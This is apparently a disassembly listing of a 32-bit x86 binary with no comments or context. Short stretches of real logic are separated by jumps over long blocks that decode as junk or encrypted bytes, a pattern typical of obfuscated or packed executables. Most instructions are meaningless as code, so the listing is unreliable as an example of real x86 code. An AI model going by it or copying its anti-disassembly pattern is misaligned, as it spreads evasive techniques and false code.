  40ea5c:	nop
  40ea5d:	adc    esi,DWORD PTR [edi+ebx*1]
  40ea60:	shl    BYTE PTR [ebx+eax*4],1
  40ea63:	pop    eax
  40ea64:	mov    edx,0x69c7189a
  40ea69:	xor    al,0x89
  40ea6b:	bnd je 0x40ea46
  40ea6e:	int    0xe6
  40ea70:	mov    al,0x4
  40ea72:	ins    DWORD PTR es:[edi],dx
  40ea73:	push   0x6d
  40ea75:	sbb    eax,0xdb67981c
  40ea7a:	mov    eax,ds:0x3dbda236
  40ea7f:	test   eax,0x2037694
  40ea84:	adc    DWORD PTR [edi+0x2d075f0b],0x43
  40ea8b:	sti    
  40ea8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea8d:	jmp    0x40eaf9
  40ea8f:	inc    esi
  40ea90:	mov    esi,ebx
  40ea92:	mov    dh,0xb8
  40ea94:	mov    al,ds:0x2bcb068d
  40ea99:	sub    BYTE PTR [eax],ah
  40ea9b:	je     0x40ea60
  40ea9d:	inc    eax
  40ea9e:	mov    ds:0xfbe183a,eax
  40eaa3:	test   DWORD PTR [esi+0x3000000],esp
  40eaa9:	retf   0x458b
  40eaac:	or     BYTE PTR [ecx+0x443cd9],al
  40eab2:	add    BYTE PTR [ebx+0x1513f04d],cl
  40eab8:	in     eax,0xfc
  40eaba:	inc    edx
  40eabb:	add    BYTE PTR [ebx],dh
  40eabd:	mov    BYTE PTR [ebx],0xc7
  40eac0:	mov    DWORD PTR [ecx],eax
  40eac2:	sbb    ecx,0x77dc
  40eac8:	mov    eax,DWORD PTR [ebp-0x10]
  40eacb:	adc    ecx,0x4d7b
  40ead1:	mov    ecx,DWORD PTR [ebp-0x14]
  40ead4:	mov    DWORD PTR ds:0x42e128,0x11
  40eade:	cmp    DWORD PTR ds:0x42e128,0x0
  40eae5:	je     0x40eb43
  40eaeb:	cmp    DWORD PTR ds:0x42e128,0x2
  40eaf2:	jne    0x40eb15
  40eaf8:	push   0x42e130
  40eafd:	push   0x42e16f
  40eb02:	push   0x1c20
  40eb07:	push   DWORD PTR [ebp-0x10]
  40eb0a:	push   0x848e
  40eb0f:	call   DWORD PTR ds:0x42e30f
  40eb15:	cmp    DWORD PTR ds:0x42e128,0x3
  40eb1c:	jne    0x40eb31
  40eb22:	xor    edx,edx
  40eb24:	or     edx,DWORD PTR ds:0x42e128
  40eb2a:	dec    edx
  40eb2b:	mov    DWORD PTR ds:0x42e128,edx
  40eb31:	mov    edx,DWORD PTR ds:0x42e128
  40eb37:	dec    edx
  40eb38:	mov    DWORD PTR ds:0x42e128,edx
  40eb3e:	jmp    0x40eade
  40eb43:	xor    ecx,esi
  40eb45:	mov    edx,0xffcd8d64
  40eb4a:	sub    edx,ecx
  40eb4c:	add    DWORD PTR [eax],edx
  40eb4e:	mov    eax,ds:0x41b27c
  40eb53:	mov    eax,DWORD PTR [eax]
  40eb55:	mov    cx,WORD PTR [ebp-0x4]
  40eb59:	movzx  ecx,cx
  40eb5c:	add    ecx,DWORD PTR [eax]
  40eb5e:	mov    DWORD PTR [ebp-0x1c],ecx
  40eb61:	mov    eax,DWORD PTR [ebp+0xc]
  40eb64:	mov    ecx,DWORD PTR [ebp+0xc]
  40eb67:	xor    eax,esi
  40eb69:	lea    eax,[eax+eax*1+0x32729c]
  40eb70:	xor    ecx,esi
  40eb72:	sub    ecx,eax
  40eb74:	mov    ax,WORD PTR [ebp-0x4]
  40eb78:	movzx  eax,ax
  40eb7b:	jmp    0x40ece5
  40eb80:	or     BYTE PTR [edi],dl
  40eb82:	shr    BYTE PTR [edx-0x31],0x71
  40eb86:	mov    dl,0x71
  40eb88:	inc    eax
  40eb89:	(bad)  
  40eb8a:	pop    esp
  40eb8b:	mov    ch,0x79
  40eb8d:	add    esp,DWORD PTR [ebx+0x70aff720]
  40eb93:	jo     0x40eb58
  40eb95:	jg     0x40ec07
  40eb97:	jo     0x40ebd9
  40eb99:	adc    DWORD PTR [ebx-0x1f3c9f05],esp
  40eb9f:	and    DWORD PTR [ecx],esi
  40eba1:	bound  ecx,QWORD PTR [ecx+edx*2]
  40eba4:	mov    al,ds:0x83a0fab6
  40eba9:	pop    eax
  40ebaa:	dec    ecx
  40ebab:	fmul   DWORD PTR [ecx-0x1b73066d]
  40ebb1:	jl     0x40ebd0
  40ebb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebb4:	pop    ss
  40ebb5:	cs (bad) 
  40ebb7:	sbb    al,0xe0
  40ebb9:	and    BYTE PTR [edi+0x38],cl
  40ebbc:	cmp    al,0xcc
  40ebbe:	repz aad 0xa6
  40ebc1:	sub    cl,BYTE PTR [esp+ebp*4]
  40ebc4:	xor    DWORD PTR [esi+ebp*1],edx
  40ebc7:	dec    ebp
  40ebc8:	pop    ss
  40ebc9:	jecxz  0x40eb68
  40ebcb:	xor    DWORD PTR [edx+0x39],edx
  40ebce:	iret   
  40ebcf:	dec    esp
  40ebd0:	mov    dh,0x71
  40ebd2:	adc    DWORD PTR [ebx+ecx*2+0xb024cfb],eax
  40ebd9:	inc    eax
  40ebda:	cmp    ah,bh
  40ebdc:	aad    0xcf
  40ebde:	in     al,0x63
  40ebe0:	test   al,0xf4
  40ebe2:	ret    
  40ebe3:	into   
  40ebe4:	test   eax,0x902f7a36
  40ebe9:	inc    esp
  40ebea:	test   BYTE PTR [ebx],0x9a
  40ebed:	data16 sbb al,0x9f
  40ebf0:	push   ecx
  40ebf1:	add    ebx,ebp
  40ebf3:	mov    esp,0x1175ffd5
  40ebf8:	sub    eax,0xae6250c8
  40ebfd:	mov    WORD PTR [ecx-0xec079ae],es
  40ec03:	or     ah,BYTE PTR [edi+0x53]
  40ec06:	sahf   
  40ec07:	mov    esp,0x469f2986
  40ec0c:	jb     0x40ec8d
  40ec0e:	mov    eax,ds:0x22cf2363
  40ec13:	sub    ebp,edi
  40ec15:	jecxz  0x40ec84
  40ec17:	ror    BYTE PTR [esi-0x55591179],0x20
  40ec1e:	repnz or ebx,DWORD PTR [ecx+0x64]
  40ec22:	xor    DWORD PTR [ebp+esi*8-0x6a],ecx
  40ec26:	or     bh,bl
  40ec28:	jmp    0x2f56:0xe90b9496
  40ec2f:	mov    ah,BYTE PTR [edx+0x7f]
  40ec32:	addr16 adc al,0xe
  40ec35:	jbe    0x40ec41
  40ec37:	push   esi
  40ec38:	fsub   QWORD PTR [ecx+edx*4]
  40ec3b:	fnstsw WORD PTR [edi]
  40ec3d:	dec    ecx
  40ec3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec3f:	ins    BYTE PTR es:[edi],dx
  40ec40:	dec    ebx
  40ec41:	xchg   ebx,eax
  40ec42:	test   eax,0x893012dd
  40ec47:	stos   BYTE PTR es:[edi],al
  40ec48:	loop   0x40ec19
  40ec4a:	pop    eax
  40ec4b:	cmp    BYTE PTR [edx],ah
  40ec4d:	pushf  
  40ec4e:	jg     0x40ec4c
  40ec50:	sti    
  40ec51:	push   edi
  40ec52:	adc    esi,0x50
  40ec55:	pusha  
  40ec56:	push   ecx
  40ec57:	hlt    
  40ec58:	shr    edx,cl
  40ec5a:	addr16 daa 
  40ec5c:	mov    WORD PTR [eax],cs
  40ec5e:	inc    ebp
  40ec5f:	rcl    BYTE PTR [ecx+0xc5313f5],1
  40ec65:	arpl   bx,di
  40ec67:	push   cs
  40ec68:	sahf   
  40ec69:	jle    0x40ec47
  40ec6b:	das    
  40ec6c:	inc    ecx
  40ec6d:	jge    0x40ec27
  40ec6f:	sbb    dh,bh
  40ec71:	cmp    dl,BYTE PTR [ebx]
  40ec73:	sub    cl,ch
  40ec75:	sbb    eax,0x3241c03e
  40ec7a:	jo     0x40ecf2
  40ec7c:	sbb    eax,0x3f6a6a5a
  40ec81:	pop    ds
  40ec82:	jge    0x40ec9a
  40ec84:	rcl    BYTE PTR [ebx-0x5dde95fd],cl
  40ec8a:	or     cl,BYTE PTR ds:0xbdc7bc14
  40ec90:	or     DWORD PTR [eax],edx
  40ec92:	add    DWORD PTR [esi-0x70],ecx
  40ec95:	add    edx,DWORD PTR [edx+edx*1]
  40ec98:	and    al,0x2e
  40ec9a:	cmp    BYTE PTR [eax+0x6f5d21e],dl
  40eca0:	pop    ss
  40eca1:	mov    ah,0xc9
  40eca3:	mov    ecx,0x173c0164
  40eca8:	xor    edi,DWORD PTR [eax+0x43598311]
  40ecae:	sbb    BYTE PTR [ebx-0x13],ah
  40ecb1:	loop   0x40ec7c
  40ecb3:	cmc    
  40ecb4:	loop   0x40eceb
  40ecb6:	scas   eax,DWORD PTR es:[edi]
  40ecb7:	dec    ecx
  40ecb8:	push   edx
  40ecb9:	(bad)  
  40ecba:	cli    
  40ecbb:	push   0xffffffaf
  40ecbd:	mov    ds:0x97f788f3,eax
  40ecc2:	xchg   edi,ebp
  40ecc4:	retf   
  40ecc5:	fist   WORD PTR [esi]
  40ecc7:	call   0x5f1136b2
  40eccc:	mov    eax,ds:0x64e007d2
  40ecd1:	stos   DWORD PTR es:[edi],eax
  40ecd2:	sahf   
  40ecd3:	aas    
  40ecd4:	pop    ecx
  40ecd5:	mov    bl,0x9a
  40ecd7:	lds    edi,FWORD PTR [ecx]
  40ecd9:	lahf   
  40ecda:	fwait
  40ecdb:	sub    DWORD PTR [eax],ecx
  40ecdd:	jecxz  0x40ed30
  40ecdf:	xor    dh,BYTE PTR [edi+0x29]
  40ece2:	push   eax
  40ece3:	lock cmp eax,0x458bc13b
  40ece9:	in     al,dx
  40ecea:	movzx  ecx,WORD PTR [ebp-0x4]
  40ecee:	jmp    0x40ee58
  40ecf3:	movntps XMMWORD PTR [edi+edi*8+0x64],xmm4
  40ecf8:	push   edi
  40ecf9:	rep stos DWORD PTR es:[edi],eax
  40ecfb:	mov    dh,0x81
  40ecfd:	push   ebx
  40ecfe:	jle    0x40ed24
  40ed00:	jmp    0xaefbe857
  40ed05:	jo     0x40ed77
  40ed07:	ret    
  40ed08:	jg     0x40ed7a
  40ed0a:	jo     0x40ed39
  40ed0c:	jmp    0x40ecef
  40ed0e:	push   0x17
  40ed10:	pop    ebp
  40ed11:	xor    BYTE PTR [edi-0x752ce329],ah
  40ed17:	mov    bl,0xf2
  40ed19:	push   esi
  40ed1a:	mov    eax,ds:0x4c8a2c12
  40ed1f:	loopne 0x40ed3f
  40ed21:	enter  0x8467,0x94
  40ed25:	hlt    
  40ed26:	nop
  40ed27:	sub    esp,DWORD PTR [esi+0x2c]
  40ed2a:	and    dl,BYTE PTR [esi]
  40ed2c:	add    cl,BYTE PTR ds:0x956c1f2e
  40ed32:	mov    ah,0x34
  40ed34:	xor    BYTE PTR [esi-0x23],al
  40ed37:	sti    
  40ed38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed39:	gs push 0xa806bea
  40ed3f:	xchg   edi,eax
  40ed40:	scas   al,BYTE PTR es:[edi]
  40ed41:	sub    edx,DWORD PTR [ecx-0x6d]
  40ed44:	retf   0x251e
  40ed47:	mov    bl,0xae
  40ed49:	sub    eax,0x68778f3a
  40ed4e:	mov    bh,0x49
  40ed50:	push   edx
  40ed51:	jbe    0x40ed46
  40ed53:	xchg   esp,eax
  40ed54:	(bad)  
  40ed55:	mov    edi,DWORD PTR [ecx+0x6332a68a]
  40ed5b:	sub    DWORD PTR [eax-0x7c],edi
  40ed5e:	popf   
  40ed5f:	lds    esp,FWORD PTR [esi]
  40ed61:	jo     0x40ecee
  40ed63:	push   ecx
  40ed64:	loopne 0x40eda2
  40ed66:	xchg   ax,ax
  40ed68:	mov    ch,0xb5
  40ed6a:	pushf  
  40ed6b:	into   
  40ed6c:	inc    edx
  40ed6d:	jp     0x40ed55
  40ed6f:	scas   al,BYTE PTR es:[edi]
  40ed70:	call   0x742b4d00
  40ed75:	jb     0x40ed24
  40ed77:	pop    DWORD PTR [esi+0x7116de28]
  40ed7d:	test   DWORD PTR [esi],ebx
  40ed7f:	mov    al,ds:0xd95a10f8
  40ed84:	fs jge 0x40edbf
  40ed87:	sub    al,0x7a
  40ed89:	mov    ds:0xf7e8a995,al
  40ed8e:	daa    
  40ed8f:	jno    0x40edb9
  40ed91:	out    0x97,eax
  40ed93:	les    eax,FWORD PTR ds:0x7ced2350
  40ed99:	lds    ecx,FWORD PTR [edi+0x34e2936b]
  40ed9f:	rdtsc  
  40eda1:	stc    
  40eda2:	cmc    
  40eda3:	jmp    0x40ed62
  40eda5:	ds inc esp
  40eda7:	pop    ss
  40eda8:	xor    eax,0xe9a5d5d4
  40edad:	or     eax,0x31ec7777
  40edb2:	das    
  40edb3:	call   0xf594:0xd8a73469
  40edba:	cmp    esi,DWORD PTR [ecx-0x72]
  40edbd:	adc    eax,0xfdf2edb
  40edc2:	dec    esi
  40edc3:	xchg   ebx,eax
  40edc4:	and    eax,0x4118397
  40edc9:	sbb    eax,0xbc33e35d
  40edce:	fnstenv [edi-0x76756b54]
  40edd4:	shl    DWORD PTR [ebp+ebp*2-0x2035bf8b],cl
  40eddb:	inc    eax
  40eddc:	inc    edi
  40eddd:	repz test dl,bl
  40ede0:	in     al,dx
  40ede1:	and    BYTE PTR [edx],ch
  40ede3:	jae    0x40edce
  40ede5:	ret    
  40ede6:	(bad)  
  40ede7:	xchg   edi,eax
  40ede8:	lea    esp,[edi-0x17126eb1]
  40edee:	mov    eax,0x76359f22
  40edf3:	or     BYTE PTR [ebp-0x2e],al
  40edf6:	jg     0x40eddb
  40edf8:	mov    ebx,0x182a2075
  40edfd:	test   esp,esp
  40edff:	and    al,0x86
  40ee01:	jnp    0x40ee6e
  40ee03:	ret    
  40ee04:	jmp    0x40edb8
  40ee06:	sub    BYTE PTR [edx+0xa6631c6],dh
  40ee0c:	cs pusha 
  40ee0e:	adc    ecx,DWORD PTR [ecx+0x4f57a575]
  40ee14:	dec    ebx
  40ee15:	cdq    
  40ee16:	call   0x8d3b:0xc8c1abcd
  40ee1d:	cmp    al,0x7d
  40ee1f:	add    al,0xc4
  40ee21:	inc    esi
  40ee22:	pop    esp
  40ee23:	cwde   
  40ee24:	out    dx,al
  40ee25:	push   eax
  40ee26:	push   edi
  40ee27:	(bad)  
  40ee29:	jle    0x40edfe
  40ee2b:	loopne 0x40ee28
  40ee2d:	xchg   esi,eax
  40ee2e:	xor    al,0x49
  40ee30:	sbb    eax,0xff147b13
  40ee35:	jo     0x40ee97
  40ee37:	push   ecx
  40ee38:	or     ch,dh
  40ee3a:	or     eax,0xf533e4c
  40ee3f:	les    edx,FWORD PTR [ecx]
  40ee41:	xchg   esp,eax
  40ee42:	or     BYTE PTR [edi],dh
  40ee44:	cmp    eax,0x71d7a1e1
  40ee49:	sbb    eax,DWORD PTR [ecx+0x4f]
  40ee4c:	xor    BYTE PTR [ebx+0x1f],cl
  40ee4f:	sar    ah,1
  40ee51:	int    0xc5
  40ee53:	mov    ah,0xf3
  40ee55:	lahf   
  40ee56:	dec    esp
  40ee57:	mov    ds:0x1798f0f,eax
  40ee5c:	add    BYTE PTR [eax],al
  40ee5e:	xor    eax,esi
  40ee60:	sub    ecx,eax
  40ee62:	sub    ecx,edi
  40ee64:	mov    WORD PTR [ebp-0x4],cx
  40ee68:	jmp    0x40efe4
  40ee6d:	jmp    0x40efd7
  40ee72:	int3   
  40ee73:	push   ebp
  40ee74:	(bad)  
  40ee75:	icebp  
  40ee76:	xchg   ecx,eax
  40ee77:	icebp  
  40ee78:	je     0x40eeef
  40ee7a:	in     al,0x65
  40ee7c:	pop    edx
  40ee7d:	mov    cl,0x34
  40ee7f:	mov    ch,BYTE PTR [edx+0x24]
  40ee82:	or     eax,0xc37070ac
  40ee87:	jg     0x40eef9
  40ee89:	jo     0x40ef07
  40ee8b:	leave  
  40ee8c:	inc    eax
  40ee8d:	inc    edi
  40ee8e:	inc    ecx
  40ee8f:	int    0x38
  40ee91:	mov    ecx,DWORD PTR [edi+0x5b]
  40ee94:	in     al,0xec
  40ee96:	popa   
  40ee97:	test   BYTE PTR [bp+di-0x79d2],0x24
  40ee9d:	and    cl,BYTE PTR [edx]
  40ee9f:	leave  
  40eea0:	and    al,0xf5
  40eea2:	lods   al,BYTE PTR ds:[esi]
  40eea3:	addr16 out dx,eax
  40eea5:	call   0x6f62f166
  40eeaa:	fcom   QWORD PTR [esi+0x6c]
  40eead:	rcl    DWORD PTR [edi+0x32fd36a7],cl
  40eeb3:	mov    DWORD PTR [edx],eax
  40eeb5:	pop    ds
  40eeb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eeb7:	push   ss
  40eeb8:	mov    ah,BYTE PTR cs:[ecx+0xc7d48b0]
  40eebf:	lds    esi,FWORD PTR [eax-0x3d]
  40eec2:	cmp    ebp,DWORD PTR [edx-0x3d]
  40eec5:	xchg   esp,eax
  40eec6:	xchg   edi,eax
  40eec7:	xchg   esp,eax
  40eec8:	push   cs
  40eec9:	dec    ebp
  40eeca:	mov    esi,esp
  40eecc:	mov    ebp,0x699d4781
  40eed1:	cmc    
  40eed2:	ret    0x59f6
  40eed5:	fisub  DWORD PTR [ebp+ecx*2-0x13]
  40eed9:	pusha  
  40eeda:	daa    
  40eedb:	and    ch,bl
  40eedd:	inc    esi
  40eede:	xchg   ebx,eax
  40eedf:	loope  0x40eea8
  40eee1:	adc    esp,DWORD PTR [ebp-0x22]
  40eee4:	(bad)  
  40eee5:	sti    
  40eee6:	pop    ecx
  40eee7:	lea    esi,[ecx]
  40eee9:	enter  0xb07e,0x47
  40eeed:	imul   ebx,esi,0xffffff8a
  40eef0:	pushf  
  40eef1:	das    
  40eef2:	push   ebx
  40eef3:	dec    esp
  40eef4:	xor    edi,DWORD PTR [esi-0x68]
  40eef7:	jle    0x40ef16
  40eef9:	popf   
  40eefa:	push   edx
  40eefb:	push   eax
  40eefc:	xchg   esi,eax
  40eefd:	push   ebx
  40eefe:	loopne 0x40eedd
  40ef00:	rol    BYTE PTR [esi+ebx*8+0x543542b3],0xe1
  40ef08:	inc    ecx
  40ef09:	bswap  ecx
  40ef0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef0c:	sti    
  40ef0d:	ret    
  40ef0e:	inc    esp
  40ef0f:	stos   DWORD PTR es:[edi],eax
  40ef10:	addr16 mov bh,0x55
  40ef13:	cli    
  40ef14:	mov    fs,WORD PTR [edi-0x58bdb38d]
  40ef1a:	in     eax,0xb4
  40ef1c:	cmp    bl,BYTE PTR [ecx]
  40ef1e:	test   BYTE PTR [edx+ebp*1],0x48
  40ef22:	ss inc esp
  40ef24:	lea    ebp,[esi]
  40ef26:	add    ah,0x8e
  40ef29:	sbb    ebp,DWORD PTR [ebp+edi*8-0x6c]
  40ef2d:	loope  0x40ef9b
  40ef2f:	mov    ecx,0xc08d2e36
  40ef34:	sub    DWORD PTR [esi+ebx*1-0x358b1bf2],edi
  40ef3b:	inc    esi
  40ef3c:	out    dx,al
  40ef3d:	sub    bl,BYTE PTR ss:[edx-0x44]
  40ef41:	stos   DWORD PTR es:[edi],eax
  40ef42:	or     al,0x8a
  40ef44:	mov    al,ds:0x32baf56
  40ef49:	pushf  
  40ef4a:	sbb    DWORD PTR [eax],ecx
  40ef4c:	stos   DWORD PTR es:[edi],eax
  40ef4d:	jbe    0x40eee8
  40ef4f:	js     0x40efbf
  40ef51:	clc    
  40ef52:	add    ebx,ebx
  40ef54:	inc    eax
  40ef55:	xchg   edx,eax
  40ef56:	lods   al,BYTE PTR ds:[esi]
  40ef57:	in     eax,0xe6
  40ef59:	dec    ebp
  40ef5a:	xor    edx,edi
  40ef5c:	dec    ebp
  40ef5d:	or     al,0x53
  40ef5f:	inc    esi
  40ef60:	push   0x81e70d03
  40ef65:	sub    dl,BYTE PTR [edi+0x3608483a]
  40ef6b:	dec    esp
  40ef6c:	or     BYTE PTR [eax],dh
  40ef6e:	shl    DWORD PTR [ebx+0x2b59c649],1
  40ef74:	adc    eax,0x48742467
  40ef79:	sahf   
  40ef7a:	data16 cmp al,0xc4
  40ef7d:	sar    BYTE PTR [eax],1
  40ef7f:	lods   eax,DWORD PTR ds:[esi]
  40ef80:	fcmove st,st(7)
  40ef82:	add    al,0x71
  40ef84:	dec    esi
  40ef85:	xlat   BYTE PTR ds:[ebx]
  40ef86:	pop    ss
  40ef87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef88:	frstor [eax+0x54a2f433]
  40ef8e:	in     eax,dx
  40ef8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef90:	(bad)  
  40ef91:	cs pop eax
  40ef93:	mov    dl,0x5f
  40ef95:	sti    
  40ef96:	or     edx,ebx
  40ef98:	(bad)  
  40ef99:	pop    edi
  40ef9a:	xor    bl,BYTE PTR [ecx-0x420e7688]
  40efa0:	cmp    eax,0xf907d128
  40efa5:	mov    dh,0x2d
  40efa7:	sahf   
  40efa8:	jge    0x40ef92
  40efaa:	jns    0x40efd5
  40efac:	jl     0x40ef5b
  40efae:	(bad)  
  40efaf:	(bad)  [eax+0x4aced0e7]
  40efb5:	imul   ebp,DWORD PTR [ebx],0xb32e2ec1
  40efbb:	inc    eax
  40efbc:	sbb    BYTE PTR [eax],ah
  40efbe:	les    ebp,FWORD PTR [esi-0x40]
  40efc1:	ins    DWORD PTR es:[edi],dx
  40efc2:	sahf   
  40efc3:	cmp    esi,DWORD PTR ds:0x292acaf1
  40efc9:	mov    dh,ah
  40efcb:	mov    al,BYTE PTR [eax]
  40efcd:	std    
  40efce:	adc    eax,0x484ab8a4
  40efd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efd4:	aas    
  40efd5:	fadd   DWORD PTR [ebx]
  40efd7:	xor    eax,esi
  40efd9:	lea    eax,[eax+ecx*1+0x32729c]
  40efe0:	mov    WORD PTR [ebp-0x4],ax
  40efe4:	mov    eax,DWORD PTR [ebp-0xc]
  40efe7:	cmp    eax,ebx
  40efe9:	jmp    0x40f153
  40efee:	mov    cs,WORD PTR [ebx]
  40eff0:	enter  0x51c7,0xc3
  40eff4:	lea    edx,[ecx+0x2a]
  40eff7:	leave  
  40eff8:	inc    esi
  40eff9:	inc    ebx
  40effa:	out    0xad,al
  40effc:	lds    ecx,FWORD PTR [edx+0x7070abd0]
  40f002:	ret    
  40f003:	jg     0x40f075
  40f005:	jo     0x40efe0
  40f007:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f008:	jge    0x40efd4
  40f00a:	hlt    
  40f00b:	fs push 0x19f9c59b
  40f011:	jns    0x40f060
  40f013:	jno    0x40efca
  40f015:	ja     0x40f096
  40f017:	and    eax,0x46ead30a
  40f01c:	xor    ecx,DWORD PTR [eax+esi*4+0x5c37fe97]
  40f023:	jnp    0x40efb8
  40f025:	iret   
  40f026:	cmp    ah,BYTE PTR [ebp-0x3b]
  40f029:	xor    BYTE PTR [ebp+ebx*1+0x4e437e80],dh
  40f030:	int3   
  40f031:	pop    ebx
  40f032:	and    al,0x8a
  40f034:	sub    DWORD PTR [esi],edx
  40f036:	call   0xb2c327fb
  40f03b:	jne    0x40f087
  40f03d:	dec    esp
  40f03e:	fld    st(3)
  40f040:	enter  0x1664,0xee
  40f044:	ffree  st(1)
  40f046:	iret   
  40f047:	pushf  
  40f048:	rcr    BYTE PTR [ecx+0x6b],cl
  40f04b:	loop   0x40f035
  40f04d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f04e:	idiv   BYTE PTR [eax]
  40f050:	(bad)  
  40f051:	repz mov esp,0xb33c49a1
  40f057:	fs (bad) 
  40f059:	into   
  40f05a:	push   0xf24de776
  40f05f:	sub    DWORD PTR [edx+0x58eb3b43],edi
  40f065:	push   ebp
  40f066:	mov    ds:0x18e382f8,eax
  40f06b:	adc    al,BYTE PTR [ecx-0x1a]
  40f06e:	leave  
  40f06f:	cld    
  40f070:	sbb    eax,0xe8baf476
  40f075:	popf   
  40f076:	je     0x40f07f
  40f078:	shl    BYTE PTR [ebx+edi*8],1
  40f07b:	adc    BYTE PTR [esi-0x72],dl
  40f07e:	jae    0x40f0dd
  40f080:	hlt    
  40f081:	mov    al,ds:0x93af4148
  40f086:	add    ebx,DWORD PTR [edi]
  40f088:	add    edi,DWORD PTR [ecx+ebp*1-0x143d1af]
  40f08f:	aas    
  40f090:	je     0x40f0d0
  40f092:	mov    cl,0x53
  40f094:	ins    BYTE PTR es:[edi],dx
  40f095:	and    BYTE PTR [ecx+0x7bf0766b],bh
  40f09b:	(bad)  
  40f09c:	fidivr DWORD PTR [ebp-0x3b1cfe62]
  40f0a2:	ret    
  40f0a3:	mov    esi,0xeaedd05f
  40f0a8:	fsub   DWORD PTR [edi-0x36804450]
  40f0ae:	pop    ebx
  40f0af:	or     edi,DWORD PTR [ecx+0x23]
  40f0b2:	xchg   ebp,eax
  40f0b3:	jmp    0x40f0d0
  40f0b5:	lahf   
  40f0b6:	or     ebx,DWORD PTR [esi]
  40f0b8:	lods   eax,DWORD PTR ds:[esi]
  40f0b9:	call   0xf8119219
  40f0be:	ror    ch,1
  40f0c0:	call   0xfcf3cdc8
  40f0c5:	stos   BYTE PTR es:[edi],al
  40f0c6:	cli    
  40f0c7:	inc    ebp
  40f0c8:	inc    edx
  40f0c9:	inc    ebp
  40f0ca:	jmp    0xaf14:0x585897fb
  40f0d1:	shl    BYTE PTR [edx],1
  40f0d3:	dec    ecx
  40f0d4:	adc    ch,BYTE PTR [esi-0x2c]
  40f0d7:	xchg   esp,ecx
  40f0d9:	es retf 0x4ade
  40f0dd:	mov    ebx,0xc7b53b9d
  40f0e2:	jp     0x40f162
  40f0e4:	xor    dl,BYTE PTR [ebp-0x187ae763]
  40f0ea:	xor    edi,esi
  40f0ec:	xlat   BYTE PTR ds:[ebx]
  40f0ed:	(bad)  
  40f0ee:	retf   0x931
  40f0f1:	cdq    
  40f0f2:	mov    ah,0xfd
  40f0f4:	cmp    eax,DWORD PTR [edx+ebx*1]
  40f0f7:	jle    0x40f09f
  40f0f9:	xchg   edi,edx
  40f0fb:	and    al,0xf2
  40f0fd:	fisttp DWORD PTR [edx-0x5d]
  40f100:	jp     0x40f118
  40f102:	imul   esi,DWORD PTR [eax+0x13c5b175],0xcf92b359
  40f10c:	daa    
  40f10d:	aam    0xb
  40f10f:	add    edi,ecx
  40f111:	mov    DWORD PTR [ebp+esi*8+0xe8aff92],esp
  40f118:	xchg   ecx,eax
  40f119:	stos   DWORD PTR es:[edi],eax
  40f11a:	sub    DWORD PTR [eax],ebp
  40f11c:	add    edx,DWORD PTR [ecx-0x2e718869]
  40f122:	out    0x91,al
  40f124:	sub    BYTE PTR [edi],ch
  40f126:	push   cs
  40f127:	ins    BYTE PTR es:[edi],dx
  40f128:	in     eax,0x34
  40f12a:	rcr    dh,cl
  40f12c:	add    ebx,ebp
  40f12e:	xor    BYTE PTR [ecx-0x6f],dl
  40f131:	jns    0x40f19c
  40f133:	and    eax,0x116d19f2
  40f138:	enter  0x2e70,0xa
  40f13c:	call   0x139e1f83
  40f141:	loopne 0x40f178
  40f143:	repnz stc 
  40f145:	lods   eax,DWORD PTR ds:[esi]
  40f146:	(bad)  
  40f147:	out    dx,eax
  40f148:	enter  0x52c0,0x79
  40f14c:	sub    eax,0xb0c948b2
  40f151:	inc    ebx
  40f152:	push   ecx
  40f153:	je     0x40f2d1
  40f159:	mov    eax,DWORD PTR [ebp-0x8]
  40f15c:	jmp    0x40f2c6
  40f161:	lods   eax,DWORD PTR ds:[esi]
  40f162:	ret    0xcc29
  40f165:	jno    0x40f15a
  40f167:	ins    DWORD PTR es:[edi],dx
  40f168:	popa   
  40f169:	fdivr  DWORD PTR [ecx]
  40f16b:	xchg   ecx,eax
  40f16c:	test   DWORD PTR [edx+0x1f],edi
  40f16f:	xchg   esp,eax
  40f170:	mov    dl,0xa3
  40f172:	stos   BYTE PTR es:[edi],al
  40f173:	jo     0x40f1e5
  40f175:	ret    
  40f176:	jg     0x40f1e8
  40f178:	jo     0x40f1ac
  40f17a:	xchg   esi,eax
  40f17b:	bound  edi,QWORD PTR [ebx-0xd]
  40f17e:	mov    cl,0xc2
  40f180:	sub    dl,0x83
  40f183:	push   ss
  40f184:	mov    bl,0xac
  40f186:	fdivr  QWORD PTR [esi]
  40f188:	test   cl,dl
  40f18a:	push   0xe93fd82e
  40f18f:	add    al,0x31
  40f191:	and    eax,0xf65b5012
  40f196:	dec    ebx
  40f197:	int    0x24
  40f199:	ss nop
  40f19b:	outs   dx,DWORD PTR ds:[esi]
  40f19c:	push   edx
  40f19d:	pop    ecx
  40f19e:	mov    dl,0xe9
  40f1a0:	fadd   DWORD PTR [edi+edi*1]
  40f1a3:	clc    
  40f1a4:	add    edx,DWORD PTR [ebx-0x79]
  40f1a7:	test   eax,0x562afc5b
  40f1ac:	outs   dx,DWORD PTR ds:[esi]
  40f1ad:	nop
  40f1ae:	jl     0x40f1a6
  40f1b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1b1:	push   0xeefac865
  40f1b6:	jo     0x40f20d
  40f1b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1b9:	stc    
  40f1ba:	test   BYTE PTR [esp+eax*4+0xb],bh
  40f1be:	jp     0x40f16b
  40f1c0:	cli    
  40f1c1:	mov    BYTE PTR [edx],ch
  40f1c3:	xchg   edi,eax
  40f1c4:	mov    ebx,0x3f599841
  40f1c9:	push   0x44831068
  40f1ce:	xor    DWORD PTR ss:[edx+0x60],esi
  40f1d2:	call   DWORD PTR [esi]
  40f1d4:	test   DWORD PTR [edi+0x38d13b7e],0x850aa043
  40f1de:	gs popf 
  40f1e0:	xchg   esi,eax
  40f1e1:	lahf   
  40f1e2:	add    BYTE PTR [edi-0x2b],al
  40f1e5:	jne    0x40f1cc
